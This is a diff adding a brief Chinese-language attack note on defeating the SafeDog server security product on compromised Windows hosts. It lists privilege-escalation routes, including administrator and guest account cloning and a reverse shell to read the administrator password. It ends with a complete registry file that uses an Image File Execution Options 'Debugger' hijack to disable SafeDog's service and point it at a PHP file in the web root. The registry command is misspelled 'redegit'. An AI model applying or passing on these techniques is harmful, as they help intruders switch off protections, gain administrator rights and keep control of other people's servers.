@@ -1,0 +1,16 @@
+Kill Dog：
+
+1.安全狗默认只拦截加管理组，不拦截加用户
+  法a：利用用户克隆exp：直接克隆administrator的权限
+  法b：反弹shell读取管理员密码
+  法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭
+2.安全狗账号防护最严程度：拦截添加用户
+  法a：激活guest，然后克隆用户
+  法b：反弹shell读取管理员密码
+  法c：改注册表，重启服务器，关闭安全狗
+
+redegit.reg脚本内容：
+Windows Registry Editor Version 5.00 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe]
+"Debugger"="C:\WWW\l.php"
